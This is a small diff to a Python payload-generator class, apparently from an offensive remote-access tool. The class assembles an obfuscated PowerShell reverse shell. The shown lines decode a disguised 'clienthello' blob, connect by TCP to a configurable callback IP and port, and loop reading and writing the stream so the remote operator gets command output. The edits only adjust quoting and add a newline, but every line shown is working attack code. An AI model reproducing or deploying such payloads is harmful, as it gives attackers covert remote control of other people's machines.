@@ -9,7 +9,7 @@ class Payload:
                 payload += 'for($i=0;$i-lt$r.length;$i++){$p+=($r[$i]-$k[$i%32]+255)%256}return $p};'
                 payload += '$b=\'' + encoded_clienthello + '\';'
                 payload += '$h=[convert]::frombase64string($b);'
-                payload += '$a=[net.sockets.tcpclient]::new("' + callback_ip + '",' + str(callback_port) + ');'
+                payload += '$a=[net.sockets.tcpclient]::new(\'' + callback_ip + '\',' + str(callback_port) + ');'
                 payload += '$s=$a.getstream();'
                 payload += '$s.write($h,0,50);'
                 payload += '$b=[byte[]]::new(65535);'
@@ -103,7 +103,7 @@ class Payload:
                 payload += b'    $Packet = [Byte[]] (Application-ify $EncodedOutput)' + b'\n'
                 payload += b'    $BytesWritten = $Stream.Write($Packet, 0, $Packet.Length)' + b'\n'
                 payload += b'    $BytesRead = $Stream.Read($Buffer, 0, $Buffer.Length)' + b'\n'
-                payload += b'}'
+                payload += b'}' + b'\n'
 
                 return payload
 
